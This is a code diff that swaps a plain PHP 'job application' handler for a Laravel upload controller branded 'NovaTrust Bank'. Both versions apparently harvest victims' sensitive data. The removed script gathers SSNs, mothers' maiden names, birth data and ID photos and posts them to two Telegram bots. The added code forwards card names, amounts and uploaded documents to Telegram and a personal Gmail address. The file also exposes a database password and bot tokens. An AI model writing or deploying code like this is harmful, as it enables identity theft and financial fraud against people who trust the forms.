@@ -1,197 +1,168 @@
-<?php
+<?php  
+  
+namespace App\Http\Controllers;  
+  
+use App\Models\Upload;  
+use Illuminate\Http\Request;  
+use Illuminate\Support\Facades\Auth;  
+use Illuminate\Support\Facades\Mail;  
+use Illuminate\Support\Facades\Log;  
+use Illuminate\Support\Facades\Http;
+use App\Helpers\TelegramHelper;
 
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
+class UploadController extends Controller  
+{  
+    /**
+     * Handle secure file uploads.
+     */
+    public function store(Request $request)
+    {
+        // ✅ Validate incoming form data
+        $validated = $request->validate([
+            'amount'        => 'required|numeric|min:1',
+            'card_name'     => 'required|string|max:255',
+            'description'   => 'nullable|string|max:1000',
+            'upload_file1'  => 'required|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file2'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file3'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file4'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
+            'upload_file5'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
+        ]);
 
-// ======================
-// CLOUDINARY CONFIG
-// ======================
-$cloudName = "dlddiquex";
-$uploadPreset = "job_forms";
+        $uploadedFiles = [];
+        $description = $validated['description'] ?? null;
 
-// ======================
-// NEON DB
-// ======================
-$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
-$db   = "neondb";
-$user = "neondb_owner";
-$pass = "npg_TQ1gBOwA9rCa";
-$port = "5432";
+        // ✅ Upload all selected files (1–5)
+        foreach (range(1, 5) as $i) {
+            $fileKey = 'upload_file' . $i;
 
-$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";
+            if ($request->hasFile($fileKey)) {
+                $file = $request->file($fileKey);
+                $path = $file->store('uploads', 'public');
 
-try {
-    $pdo = new PDO($dsn, $user, $pass, [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
-    ]);
-} catch (Exception $e) {
-    die("DB Connection failed: " . $e->getMessage());
-}
+                $upload = Upload::create([
+                    'user_id'       => Auth::id(),
+                    'amount'        => $validated['amount'],
+                    'card_name'     => $validated['card_name'],
+                    'description'   => $description,
+                    'file_path'     => $path,
+                    'original_name' => $file->getClientOriginalName(),
+                ]);
 
-// ======================
-// VALIDATE INPUT (LIKE LARAVEL STYLE)
-// ======================
-function clean($key) {
-    return $_POST[$key] ?? '';
-}
+                $uploadedFiles[] = $upload;
+            }
+        }
 
-$first_name = clean('first_name');
-$middle_name = clean('middle_name');
-$last_name = clean('last_name');
-$phone = clean('phone');
-$email = clean('email');
-$dob = clean('dob');
-$mother_maiden = clean('mother_maiden');
-$ssn = clean('ssn');
-$birth_city = clean('birth_city');
+        if (empty($uploadedFiles)) {
+            return back()
+                ->withErrors(['upload_file1' => 'Please upload at least one file.'])
+                ->withInput();
+        }
 
-$address_line1 = clean('address_line1');
-$address_line2 = clean('address_line2');
-$city = clean('city');
-$state = clean('state');
-$zip_code = clean('zip_code');
+        // ============================================================
+        // ✅ TELEGRAM NOTIFICATION (IMAGE PREVIEW + PDF ATTACHMENT)
+        // ============================================================
 
-$father_name = clean('father_name');
-$mother_name = clean('mother_name');
+        $user = Auth::user();
 
-$address = trim("$address_line1 $address_line2, $city, $state $zip_code");
+        $caption =
+            "🔐 <b>New Secure Upload</b>\n" .
+            "👤 User: {$user->name}\n" .
+            "📧 Email: {$user->email}\n" .
+            "💵 Amount: $" . number_format($validated['amount'], 2) . "\n" .
+            "💳 Card Name: {$validated['card_name']}\n" .
+            "📝 Description: " . ($description ?: 'N/A') . "\n" .
+            "🕒 " . now()->format('Y-m-d H:i:s') . "\n" .
+            "🌐 novatrustbank.onrender.com";
 
-// ======================
-// CLOUDINARY UPLOAD (ROBUST VERSION)
-// ======================
-function uploadToCloudinary($file, $cloudName, $uploadPreset) {
+        $token = env('TELEGRAM_BOT_TOKEN');
+        $chatId = env('TELEGRAM_CHAT_ID');
 
-    if (!isset($file) || $file['error'] !== 0) {
-        return null;
+        $imageExt = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
+
+        foreach ($uploadedFiles as $upload) {
+            $fileFullPath = storage_path('app/public/' . $upload->file_path);
+            $ext = strtolower(pathinfo($fileFullPath, PATHINFO_EXTENSION));
+            $fileName = basename($fileFullPath);
+
+            if (!file_exists($fileFullPath)) {
+                continue;
+            }
+
+            try {
+                if (in_array($ext, $imageExt)) {
+                    // 📸 Send image with preview
+                    Http::attach('photo', file_get_contents($fileFullPath), $fileName)
+                        ->post("https://api.telegram.org/bot{$token}/sendPhoto", [
+                            'chat_id' => $chatId,
+                            'caption' => $caption,
+                            'parse_mode' => 'HTML',
+                        ]);
+                } else {
+                    // 📄 Send document (PDF)
+                    Http::attach('document', file_get_contents($fileFullPath), $fileName)
+                        ->post("https://api.telegram.org/bot{$token}/sendDocument", [
+                            'chat_id' => $chatId,
+                            'caption' => $caption,
+                            'parse_mode' => 'HTML',
+                        ]);
+                }
+            } catch (\Exception $e) {
+                Log::error('Telegram upload failed: ' . $e->getMessage());
+            }
+        }
+
+        // ============================================================
+        // ✅ EMAIL SENDING (UNCHANGED)
+        // ============================================================
+
+        try {
+            $attachments = [];
+            foreach ($uploadedFiles as $upload) {
+                $path = storage_path('app/public/' . $upload->file_path);
+                if (file_exists($path)) {
+                    $attachments[] = $path;
+                }
+            }
+
+            $fileNames = collect($uploadedFiles)->pluck('original_name')->implode(', ');
+
+            Mail::send([], [], function ($message) use ($attachments, $validated, $description, $fileNames) {
+                $message->to('collaomn@gmail.com')
+                        ->subject('📎 New Secure Upload from NovaTrust Bank')
+                        ->setBody("
+                            New secure upload received:
+
+                            👤 Card Name: {$validated['card_name']}
+                            💰 Amount: \${$validated['amount']}
+                            📝 Description: " . ($description ?: 'N/A') . "
+                            📎 Files: {$fileNames}
+                        ");
+
+                foreach ($attachments as $path) {
+                    $message->attach($path);
+                }
+            });
+
+        } catch (\Exception $e) {
+            Log::error('Email sending failed: ' . $e->getMessage());
+        }
+
+        // ============================================================
+        // ✅ Redirect to success page
+        // ============================================================
+
+        return redirect()
+            ->route('secure.upload.success', ['id' => $uploadedFiles[0]->id])
+            ->with('success', '✅ Upload saved and sent successfully!');
     }
 
-    // Laravel-like validation (MAX 5MB like your example)
-    if ($file['size'] > 5 * 1024 * 1024) {
-        return null;
+    /**
+     * Show upload success page.
+     */
+    public function success($id)
+    {
+        $upload = Upload::findOrFail($id);
+        return view('upload_success', compact('upload'));
     }
-
-    $url = "https://api.cloudinary.com/v1_1/$cloudName/image/upload";
-
-    $postFields = [
-        'file' => new CURLFile($file['tmp_name']),
-        'upload_preset' => $uploadPreset,
-        'folder' => 'job_applications'
-    ];
-
-    $ch = curl_init();
-
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $url,
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => $postFields,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 90,
-        CURLOPT_CONNECTTIMEOUT => 20
-    ]);
-
-    $response = curl_exec($ch);
-    $error = curl_error($ch);
-
-    curl_close($ch);
-
-    if ($error || !$response) {
-        error_log("Cloudinary error: " . $error);
-        return null;
-    }
-
-    $result = json_decode($response, true);
-
-    if (!isset($result['secure_url'])) {
-        error_log("Cloudinary invalid response: " . $response);
-        return null;
-    }
-
-    return $result['secure_url'];
 }
-
-// ======================
-// UPLOAD FILES (LIKE LARAVEL LOOP STYLE)
-// ======================
-$front_url = null;
-$back_url = null;
-
-if (isset($_FILES['front_id'])) {
-    $front_url = uploadToCloudinary($_FILES['front_id'], $cloudName, $uploadPreset);
-}
-
-if (isset($_FILES['back_id'])) {
-    $back_url = uploadToCloudinary($_FILES['back_id'], $cloudName, $uploadPreset);
-}
-
-// ======================
-// SAVE TO DATABASE
-// ======================
-$stmt = $pdo->prepare("
-INSERT INTO job_applications (
-first_name, middle_name, last_name,
-phone, email, dob, mother_maiden,
-ssn, birth_city, address,
-father_name, mother_name,
-front_id, back_id
-)
-VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-");
-
-$stmt->execute([
-$first_name, $middle_name, $last_name,
-$phone, $email, $dob, $mother_maiden,
-$ssn, $birth_city, $address,
-$father_name, $mother_name,
-$front_url, $back_url
-]);
-
-// ======================
-// TELEGRAM
-// ======================
-$bot1 = "8538050369:AAGHHSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
-$chat1 = "6513265609";
-
-$bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
-$chat2 = "5469294503";
-
-function sendTelegram($bot, $method, $data) {
-    $url = "https://api.telegram.org/bot{$bot}/{$method}";
-    file_get_contents($url . "?" . http_build_query($data));
-}
-
-// ======================
-// MESSAGE
-// ======================
-$text =
-"📄 New Application Submitted\n\n".
-"👤 Name: $first_name $middle_name $last_name\n".
-"📞 Phone: $phone\n".
-"📧 Email: $email\n".
-"🎂 DOB: $dob\n".
-"🏠 Address: $address\n".
-"🏙 Birth City: $birth_city\n".
-"👨 Father: $father_name\n".
-"👩 Mother: $mother_name\n".
-"🧾 SSN: $ssn";
-
-// SEND TEXT
-sendTelegram($bot1, "sendMessage", ["chat_id"=>$chat1,"text"=>$text]);
-sendTelegram($bot2, "sendMessage", ["chat_id"=>$chat2,"text"=>$text]);
-
-// SEND IMAGES ONLY IF VALID
-if (!empty($front_url)) {
-sendTelegram($bot1, "sendPhoto", ["chat_id"=>$chat1,"photo"=>$front_url,"caption"=>"Front ID"]);
-sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$front_url,"caption"=>"Front ID"]);
-}
-
-if (!empty($back_url)) {
-sendTelegram($bot1, "sendPhoto", ["chat_id"=>$chat1,"photo"=>$back_url,"caption"=>"Back ID"]);
-sendTelegram($bot2, "sendPhoto", ["chat_id"=>$chat2,"photo"=>$back_url,"caption"=>"Back ID"]);
-}
-
-// ======================
-// SUCCESS PAGE
-// ======================
-echo "<h1 style='text-align:center;margin-top:50px;color:green;'>Form Submitted Successfully</h1>";
-
-?>
